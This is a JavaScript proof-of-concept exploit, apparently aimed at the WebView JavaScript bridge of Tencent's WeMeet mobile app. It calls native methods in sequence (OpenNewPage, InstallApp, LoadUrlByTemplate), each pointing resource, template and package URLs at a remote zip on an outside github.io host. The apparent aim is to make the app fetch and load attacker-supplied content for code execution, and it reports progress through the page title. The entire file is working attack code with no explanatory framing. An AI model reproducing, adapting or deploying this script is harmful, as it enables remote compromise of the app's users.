(function(){
  document.title='P95TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P95CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,64);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P95TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P95TB-NOMGR:'+location.host;return}
  var zip='https://gitwhs.github.io/wm-poc-rce/p95res.zip';
  var md5='c930ae3975db9f9e211e831eeab26540';
  var extras={
    model_resource_url:zip,
    model_resource_md5:md5,
    resource_url:zip,
    resource_md5:md5,
    template_url:zip,
    template_id:'p95',
    download_url:zip,
    url:zip,
    from_webView:true
  };
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['FB','CommonPlugin','OpenNewPage',{
      scheme:'wemeet://page/facebeauty',
      router_params:extras
    }],
    ['VP','CommonPlugin','OpenNewPage',{
      scheme:'wemeet://page/virtualbg_preview',
      router_params:extras
    }],
    ['IA','AppManager','InstallApp',{
      package_path:zip,
      package_id:'com.tencent.wemeet.app',
      path:zip,
      url:zip,
      fileName:'p95res.zip'
    }],
    ['LT','CommonPlugin','LoadUrlByTemplate',{
      url:zip,
      template_url:zip
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P95TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P95-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 3500);
  }
  setTimeout(n, 800);
})();
